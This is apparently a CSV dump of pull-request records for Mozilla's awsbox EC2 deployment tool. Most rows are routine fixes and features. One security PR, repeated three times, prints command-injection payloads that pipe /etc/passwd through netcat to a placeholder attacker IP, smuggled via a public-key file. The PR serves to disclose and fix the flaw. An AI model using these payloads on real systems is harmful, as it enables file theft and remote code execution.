,pullid,pulls_number,pulltitle,pullsbody,pullsuserlogin,pullsuserid,pullauthordate,author_association,merged_status,stats_addns,stats_delns,stats_changed_files,pull_repo_desc,pull_repo_lang,pull_commit_sha,pull_commit_message
86,https://api.github.com/repos/mozilla/awsbox/pulls/70,70,Prevent local and remote command injection in ssh.js,"## exports.addSSHPubKey

`exports.addSSHPubKey` uses string concatenation to build a command that adds public keys to `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as `host`, which is extracted from a JSON object returned from an AWS API call. The `pubkey` parameter is the user-defined location of an SSH public key file. 

`pubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to upload a `pubkey` file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  
## 

OS command injection is also possible on the remote AWS instance: 

```
"" err; cat /etc/passwd | nc other_attacker_ip 1337 # 
```

Though, this is probably a non-issue as the purpose of the tool is to allow remote root access to the AWS instance.

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/194 

---
## exports.removeSSHPubKey

`exports.removeSSHPubKey` uses string concatenation to build a command that deletes SSH public keys from `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as the `host` parameter, which is extracted from a JSON object returned from an AWS API call. The `escapedPubkey` parameter is the user-defined location of an SSH public key file. 

`escapedPubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to remove a public key using a file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/182
",nnam,2849214,2013-06-02T22:15:11Z,CONTRIBUTOR,True,63,33,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,9981003899c70b0b6639591694f5be154ab44b44,Escape pubkey to prevent remote command injection on the EC2 VM
87,https://api.github.com/repos/mozilla/awsbox/pulls/70,70,Prevent local and remote command injection in ssh.js,"## exports.addSSHPubKey

`exports.addSSHPubKey` uses string concatenation to build a command that adds public keys to `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as `host`, which is extracted from a JSON object returned from an AWS API call. The `pubkey` parameter is the user-defined location of an SSH public key file. 

`pubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to upload a `pubkey` file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  
## 

OS command injection is also possible on the remote AWS instance: 

```
"" err; cat /etc/passwd | nc other_attacker_ip 1337 # 
```

Though, this is probably a non-issue as the purpose of the tool is to allow remote root access to the AWS instance.

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/194 

---
## exports.removeSSHPubKey

`exports.removeSSHPubKey` uses string concatenation to build a command that deletes SSH public keys from `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as the `host` parameter, which is extracted from a JSON object returned from an AWS API call. The `escapedPubkey` parameter is the user-defined location of an SSH public key file. 

`escapedPubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to remove a public key using a file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/182
",nnam,2849214,2013-06-02T22:15:11Z,CONTRIBUTOR,True,63,33,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,c33a75fc4ad4a1706bfc9edd3b9854e500b23d7d,"Revert ""Escape pubkey to prevent remote command injection on the EC2 VM""

This reverts commit 9981003899c70b0b6639591694f5be154ab44b44."
88,https://api.github.com/repos/mozilla/awsbox/pulls/70,70,Prevent local and remote command injection in ssh.js,"## exports.addSSHPubKey

`exports.addSSHPubKey` uses string concatenation to build a command that adds public keys to `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as `host`, which is extracted from a JSON object returned from an AWS API call. The `pubkey` parameter is the user-defined location of an SSH public key file. 

`pubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to upload a `pubkey` file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  
## 

OS command injection is also possible on the remote AWS instance: 

```
"" err; cat /etc/passwd | nc other_attacker_ip 1337 # 
```

Though, this is probably a non-issue as the purpose of the tool is to allow remote root access to the AWS instance.

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/194 

---
## exports.removeSSHPubKey

`exports.removeSSHPubKey` uses string concatenation to build a command that deletes SSH public keys from `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as the `host` parameter, which is extracted from a JSON object returned from an AWS API call. The `escapedPubkey` parameter is the user-defined location of an SSH public key file. 

`escapedPubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to remove a public key using a file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/182
",nnam,2849214,2013-06-02T22:15:11Z,CONTRIBUTOR,True,63,33,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,04bb223baa6379e33011224ca04d146ace2f7f24,"Fixed addSSHPubKey so it properly escapes public keys and
removeSSHPubKey properly removes public keys"
89,https://api.github.com/repos/mozilla/awsbox/pulls/68,68,Pass user data from the command line,"Feature from Issue #67
",spitimage,1820846,2013-05-27T21:37:25Z,CONTRIBUTOR,True,7,2,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,efb6d67635f5351b31479f2dfd615a24d00c25bd,Pass user data from the command line
90,https://api.github.com/repos/mozilla/awsbox/pulls/66,66,added --save-dev,"added --save-dev to be able to skip a step.
",lvnilesh,93558,2013-05-23T05:12:44Z,CONTRIBUTOR,True,2,0,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2bc511923ed92b3676e4c15c0a6ead803a2abca6,"added --save-dev

added save-dev flag to"
91,https://api.github.com/repos/mozilla/awsbox/pulls/65,65,"Add optional ""ami"" property to .awsbox.json","Allows you to specify a custom AMI base image. With no ""ami"" set `awsbox create` will use the default AMI (ami-8af096e3)
### Example:

``` json
{
  ""ami"": ""ami-6f690106"",
  ""processes"": [
    ""helloworld.js""
  ]
}
```
",dannycoates,87619,2013-05-22T17:55:20Z,MEMBER,True,20,5,3,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,21a45870fcc895708094834e9faf6ef90a923307,"added an optional ""ami"" property to .awsbox.json"
92,https://api.github.com/repos/mozilla/awsbox/pulls/58,58,Added clearer error when missing env vars for aws credentials.,"Before this change the error looks like.

```
$ node awsbox.js zones
fatal error: error running 'zones' command: secretAccessKey and accessKeyId must be set
```

After change.

```
fatal error: Missing aws credentials
Please configure the AWS_ID and AWS_KEY environment variables.
```

Makes it a little clearer to the user what they need to correct :smile: and does it before entering any other code.

Cheers
",wolfeidau,50636,2013-05-11T00:43:53Z,CONTRIBUTOR,True,3,0,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,e748021397a7c203cec15fc54fce7b5ef341a20d,Added clearer error when missing env vars for aws credentials.
93,https://api.github.com/repos/mozilla/awsbox/pulls/57,57,Fix error codes that are sent to callbacks on git errors,"When the gitc library functions are called, if they error out, they currently always call the callback with a value of 0 which means we can't detect if errors actually happened or not. This fixes it so we get a true or false value to the callback.
",Standard8,520844,2013-05-02T21:52:23Z,MEMBER,True,3,3,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,ca0569b72cc2fdd9a6e8245b6ed09d902b0b2f76,Fix error codes that are sent to callbacks on git errors
94,https://api.github.com/repos/mozilla/awsbox/pulls/56,56,replace undefined checkErr function,"So you don't get:

```
reading .awsbox.json
fatal error: error running 'create' command: ReferenceError: checkErr is not defined
```

Seems easier just to inline the function code than to make a separate utils module to import checkErr from.
",jedp,532953,2013-04-12T16:51:31Z,CONTRIBUTOR,True,2,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,1a28b05b83550606922609ecef529c43cd6535bd,replace undefined checkErr function
95,https://api.github.com/repos/mozilla/awsbox/pulls/55,55,[COLORS] - added colors to logged messages,"Probably need to define helper methods for display ""Errors"", ""Info"" and ""Warning""'s with the proper color and probably need to define some basic colors to use. I found it was easier to follow the awsbox steps.
",StephaneP,147035,2013-04-09T05:54:02Z,NONE,True,59,46,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,72ada6dd0335b842f1d4514662c2b6bfc1997b4c,[COLORS] - added colors to logged messages
96,https://api.github.com/repos/mozilla/awsbox/pulls/49,49,Add -g option to use custom security group name,"After the instance is created, you can't change security groups, so something like this is needed if you don't want your awsboxen to all share the same security group.

This approach assumes the developer will manage the security group settings through some other means (web ui or java api tools).

I have another patch stashed away that takes the security group from the config file and lets the developer pass through the settings when creating the group, let me know if you'd rather go that route.
",kparlante,1069143,2013-03-09T23:14:10Z,CONTRIBUTOR,True,6,4,3,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,1d740b195b8a9c6d6825232c88b6695ae814d80f,Add ability to pass in security group name
97,https://api.github.com/repos/mozilla/awsbox/pulls/48,48,Typo,,gurjeet,159099,2013-02-21T13:10:05Z,CONTRIBUTOR,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,3bd06b4db766c3a3637aaaf11bcb2939fed36c3c,Typo
98,https://api.github.com/repos/mozilla/awsbox/pulls/46,46,exists and existsSync moved from path to fs libs.,"Using existsSync from fs if it is present. This should still support older versions, though I only tested with node v0.4.7 and v0.8.15
",simonwex,25260,2013-01-23T21:10:49Z,MEMBER,True,7,4,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,4467e81042c740819f567a1e304acfda9ce1ea5a,"Changed path.exists to fs.exists, to be compatible with node >v0.7. Also supporting backwards-compatibility."
99,https://api.github.com/repos/mozilla/awsbox/pulls/45,45,Small documentation fix,"Links were still referencing https://github.com/lloyd/awsbox/

Should be https://github.com/mozilla/awsbox/
",lorcanmcdonald,44857,2013-01-16T11:00:45Z,CONTRIBUTOR,True,2,2,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,5b555f8609d684512b0f826bfb372ee180ba2118,"Fixed links to documentation in README.md

Links were still referencing https://github.com/lloyd/awsbox/

Should be https://github.com/mozilla/awsbox/"
100,https://api.github.com/repos/mozilla/awsbox/pulls/42,42,"Added ssh key management commands: listkeys, addkey, removekey","`awsbox listkeys instanceNameOrId` cats the `authorized_keys` file

`awsbox addkey nameOrId /path/to/keyfile.rsa.pub` adds each of the keys in the keyfile that is not already in the `authorized_keys` file.

`awsbox removekey nameOrId /path/to/keyfile.rsa.pub` removes each of the keys in the keyfile that is not already in the `authorized_keys` file.
",jedp,532953,2012-11-15T02:28:55Z,CONTRIBUTOR,True,167,7,4,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,603bd56b106cb2a766ac6eb497523be06d32c1d9,"Added commands (verbs): listkeys, addkey, removekey"
101,https://api.github.com/repos/mozilla/awsbox/pulls/40,40,"Add two new features - local_hooks and an ""update"" verb.","local_hooks are hooks that allow the user to run scripts on the local machine at specified points in the process.

The update verb does a git push to the instance and then runs the poststart local hook.
",shane-tomlinson,848085,2012-10-30T16:19:09Z,MEMBER,True,27,7,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,ccf1872648a89132848e215da1038429f0082494,"Adding the notion of local_hooks to run on the local host. The only local_hook is ""postcreate"" which is run after the vm is created."
102,https://api.github.com/repos/mozilla/awsbox/pulls/40,40,"Add two new features - local_hooks and an ""update"" verb.","local_hooks are hooks that allow the user to run scripts on the local machine at specified points in the process.

The update verb does a git push to the instance and then runs the poststart local hook.
",shane-tomlinson,848085,2012-10-30T16:19:09Z,MEMBER,True,27,7,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,4dc125d776f5b47d50f58cf7fe06fc4e710ac7d1,"Merge branch 'with_update'

Conflicts:
	lib/process.js"
103,https://api.github.com/repos/mozilla/awsbox/pulls/40,40,"Add two new features - local_hooks and an ""update"" verb.","local_hooks are hooks that allow the user to run scripts on the local machine at specified points in the process.

The update verb does a git push to the instance and then runs the poststart local hook.
",shane-tomlinson,848085,2012-10-30T16:19:09Z,MEMBER,True,27,7,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,dcecd025484a49d20998f89de77941a7eebef69e,Pass all environment variables along to the GIT commands. This prevents the user from being asked for their password when pushing to a remote host.
104,https://api.github.com/repos/mozilla/awsbox/pulls/35,35,"when using --keydir, whitelist only files ending in .pub","so for example you could just say `--keydir /path/to/identity-pubkeys` and not get other files
",jedp,532953,2012-09-13T20:38:42Z,CONTRIBUTOR,True,6,2,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,850ded6432d719e79dae6330aa4a4e8cf897a3b0,"when using --keydir, whitelist only files ending in .pub"
105,https://api.github.com/repos/mozilla/awsbox/pulls/34,34,how-to for intermediate SSL certificate chaining,"useful if, like me, you get your certs from gandi or another non-root provider
",jedp,532953,2012-09-12T23:03:17Z,CONTRIBUTOR,False,29,2,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,36a1cf59e0c824697acdde5fee74b1c9956808d6,docs for chaining intermediate ssl certs
106,https://api.github.com/repos/mozilla/awsbox/pulls/34,34,how-to for intermediate SSL certificate chaining,"useful if, like me, you get your certs from gandi or another non-root provider
",jedp,532953,2012-09-12T23:03:17Z,CONTRIBUTOR,False,29,2,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,6679cec03b4f680d996d549cc1769366d47a3a46,"when using --keydir, whitelist only *.pub files"
107,https://api.github.com/repos/mozilla/awsbox/pulls/31,31,AWSBOX_PUBKEY env var,,seanmonstar,51479,2012-08-27T22:36:16Z,MEMBER,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,107046a7acf9785eb80d6e3dd7845708d6aadb9c,add AWSBOX_PUBKEY env var
108,https://api.github.com/repos/mozilla/awsbox/pulls/28,28,"Run ""yum clean metadata"" - fixes issue #27","Title says it all :)
",vthunder,435972,2012-07-29T22:38:46Z,CONTRIBUTOR,True,7,3,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,daabd1478c1a629cfc9cc6987dbdf16b58edefd5,run yum clean metadata to prevent stale cached metadata from interfering with vm update step
109,https://api.github.com/repos/mozilla/awsbox/pulls/25,25,Rephrase one of the questions,"I totally overlooked that question when I was looking for a way
to restart my services after hacking the application code.

I probably thought that this question was about rebooting the VM
itself. Not sure, but hopefully this will be clearer.
",fmarier,167821,2012-07-17T03:17:47Z,NONE,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,8142e0e3382f4f23cc0f8e93b92cac535f9d50f7,"Rephrase one of the questions

I totally overlooked that question when I was looking for a way
to restart my services after hacking the application code.

I probably thought that this question was about rebooting the VM
itself. Not sure, but hopefully this will be clearer."
110,https://api.github.com/repos/mozilla/awsbox/pulls/24,24,Apply system updates after creating and bringing up new instance,"Sorry for the awful diff. I'm really just adding 2-3 lines, but re-indenting that whole function really screws with the readability of this patch :(
",fmarier,167821,2012-07-16T04:14:08Z,NONE,True,52,38,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,5c1f7d9abd7539f7eb1cae1173c344c31bafb53b,Apply system updates after creating and bringing up new instance
111,https://api.github.com/repos/mozilla/awsbox/pulls/23,23,Hi! I fixed some code for you!,"Hi!

I am migrationBot!

Did you know that `path.{exists,existsSync}` was moved to `fs.{exists,existsSync}`,  and that `tty.setRawMode(mode)` was moved to `tty.ReadStream#setRawMode()` (i.e. `process.stdin.setRawMode()`)  in node v0.8.0? Read more @[API changes between v0.6 and v0.8](https://github.com/joyent/node/wiki/API-changes-between-v0.6-and-v0.8) 

I automatically made some changes I think will help you migrate your codebase to node v0.8.0, please review these changes and merge them if you feel they are useful, If they are not you can ignore this Pull Request.

Have a Nice Day!

--[migrationBot](https://github.com/blakmatrix/node-migrator-bot)
",node-migrator-bot,1855799,2012-07-07T02:29:47Z,NONE,False,3,3,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,d4a315f8575aef796a81a94563ac50c2d81326d8,[fix] path.existsSync was moved to fs.existsSync
112,https://api.github.com/repos/mozilla/awsbox/pulls/16,16,npm install noted.,,ozten,18924,2012-04-25T02:09:43Z,MEMBER,True,2,0,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,981627c5eeb86b0ba820112452e70a239bc5298f,npm install noted.
